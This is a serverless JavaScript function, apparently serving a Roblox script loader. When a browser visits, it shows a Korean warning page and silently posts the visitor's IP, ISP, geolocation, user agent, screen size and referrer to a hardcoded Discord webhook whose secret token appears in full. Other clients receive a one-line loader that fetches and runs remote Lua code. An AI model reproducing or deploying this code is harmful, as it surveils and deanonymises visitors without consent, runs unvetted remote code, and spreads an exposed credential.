const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573933952517799967/GfU0TKPmFzbxfy7WHSMhYPJmF1ka3yMKpdQU4T2nosQJWYrDRn257nwkmPYfwS8YM5WD';

function isBrowserRequest(headers) {
  const hasSecFetchMode = Boolean(headers.get('sec-fetch-mode'));
  const hasSecFetchDest = Boolean(headers.get('sec-fetch-dest'));
  const hasUpgradeInsecure = Boolean(headers.get('upgrade-insecure-requests'));
  const accept = (headers.get('accept') || '').toLowerCase();
  const acceptsHtml = accept.includes('text/html');

  return hasSecFetchMode || hasSecFetchDest || hasUpgradeInsecure || acceptsHtml;
}

function getClientIpFromHeaders(headers) {
  const xff = headers.get('x-forwarded-for');
  if (xff) {
    return xff.split(',')[0].trim();
  }
  return headers.get('x-nf-client-connection-ip') || headers.get('client-ip') || 'unknown';
}

export default async (req) => {
  const headers = req.headers;
  const fallbackIp = getClientIpFromHeaders(headers);

  if (isBrowserRequest(headers)) {
    const html = `<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>안내</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      background: #0f172a;
      color: #f8fafc;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      text-align: center;
      padding: 24px;
    }
    p {
      font-size: 1.5rem;
      font-weight: 600;
      line-height: 1.6;
      margin: 0;
    }
  </style>
</head>
<body>
  <p>해독하러 오지 마세요<br />당신의 IP주소가 전송됐습니다.</p>

  <script>
    (async () => {
      const webhookUrl = ${JSON.stringify(WEBHOOK_URL)};
      const fallbackIp = ${JSON.stringify(fallbackIp)};
      if (!webhookUrl) return;

      let ip = fallbackIp;
      let isp = 'unknown';
      let org = 'unknown';
      let asn = 'unknown';
      let country = 'unknown';
      let region = 'unknown';
      let city = 'unknown';
      let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';

      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        if (ipRes.ok) {
          const ipData = await ipRes.json();
          if (ipData && ipData.ip) ip = ipData.ip;
        }
      } catch (_) {}

      try {
        const infoUrl = ip && ip !== 'unknown'
          ? \`https://ipwho.is/\${encodeURIComponent(ip)}\`
          : 'https://ipwho.is/';
        const infoRes = await fetch(infoUrl);
        if (infoRes.ok) {
          const info = await infoRes.json();
          if (info && info.success !== false) {
            if (info.ip) ip = info.ip;
            isp = info.connection?.isp || info.isp || isp;
            org = info.connection?.org || info.org || org;
            asn = info.connection?.asn ? \`AS\${info.connection.asn}\` : (info.asn || asn);
            country = info.country || country;
            region = info.region || region;
            city = info.city || city;
            timezone = info.timezone?.id || timezone;
          }
        }
      } catch (_) {}

      const now = new Date();
      const kstTime = now.toLocaleString('ko-KR', {
        timeZone: 'Asia/Seoul',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      });

      const extraInfo = {
        ip,
        isp,
        org,
        asn,
        country,
        region,
        city,
        timezone,
        kstTime,
        isoTime: now.toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.userAgentData?.platform || navigator.platform || 'unknown',
        screen: \`\${screen.width}x\${screen.height}\`,
        viewport: \`\${window.innerWidth}x\${window.innerHeight}\`,
        referer: document.referrer || 'none',
        url: location.href
      };

      const summary = [
        \`IP: \${extraInfo.ip}\`,
        \`통신사(ISP): \${extraInfo.isp}\`,
        \`조직(ORG): \${extraInfo.org}\`,
        \`ASN: \${extraInfo.asn}\`,
        \`시각(KST): \${extraInfo.kstTime}\`,
        \`위치: \${extraInfo.country} / \${extraInfo.region} / \${extraInfo.city}\`,
        \`시간대: \${extraInfo.timezone}\`,
        \`화면/뷰포트: \${extraInfo.screen} / \${extraInfo.viewport}\`,
        \`언어/플랫폼: \${extraInfo.language} / \${extraInfo.platform}\`,
        \`리퍼러: \${extraInfo.referer}\`,
        \`UA: \${extraInfo.userAgent}\`
      ].join('\\n');

      const payload = {
        content: \`\`\`\`\n\${summary}\n\`\`\`\`,
        ...extraInfo
      };

      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          mode: 'no-cors'
        });
      } catch (_) {}
    })();
  </script>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
  }

  return new Response('loadstring(game:HttpGet("https://sojik-byouel-api.netlify.app/"))()', {
    status: 200,
    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
  });
};
